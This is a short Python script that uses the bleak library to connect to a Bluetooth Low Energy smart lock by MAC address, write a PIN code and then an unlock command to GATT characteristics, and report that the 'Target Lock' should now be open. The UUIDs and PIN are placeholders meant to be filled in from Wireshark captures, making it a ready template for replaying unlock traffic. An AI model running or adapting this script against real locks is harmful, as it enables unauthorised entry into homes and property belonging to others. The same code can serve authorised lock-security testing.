import asyncio
from bleak import BleakClient

# Color codes for terminal output
G = "\033[32m"
Y = "\033[33m"
R = "\033[31m"
RES = "\033[0m"

# ðŸ”§ Replace with the actual BLE device MAC address
target_mac = input("Enter Target Lock MAC address [Default: 11:22:33:44:55:66]: ").strip()
if not target_mac:
    target_mac = "11:22:33:44:55:66"

# ðŸ”§ Replace these with actual characteristic UUIDs or handles from analysis
PASSCODE_CHAR_UUID = "0000xxxx-0000-1000-8000-00805f9b34fb"
UNLOCK_CHAR_UUID   = "0000yyyy-0000-1000-8000-00805f9b34fb"

# ðŸ”§ Replace these values based on actual behavior (e.g., extracted from Wireshark)
passcode_value = bytearray(b"0000")    # PIN code
unlock_value   = bytearray([0x01])     # Unlock command

async def unlock_ble_device(mac):
    print(f"{Y}[*]{RES} Connecting to device {mac} ...")
    try:
        async with BleakClient(mac) as client:
            if await client.is_connected():
                print(f"{G}[+]{RES} Connected!")

                print(f"{Y}[*]{RES} Sending PIN code...")
                await client.write_gatt_char(PASSCODE_CHAR_UUID, passcode_value, response=True)
                print(f"{G}[+]{RES} PIN code written.")

                print(f"{Y}[*]{RES} Sending unlock command...")
                await client.write_gatt_char(UNLOCK_CHAR_UUID, unlock_value, response=True)
                print(f"{G}[+]{RES} Unlock command sent.")

                print(f"{G}[âœ”]{RES} Device should be unlocked now.")
            else:
                print(f"{R}[!] Failed to connect to device.")
    except Exception as e:
        print(f"{R}[!] Error occurred: {e}")

if __name__ == "__main__":
    asyncio.run(unlock_ble_device(target_mac))
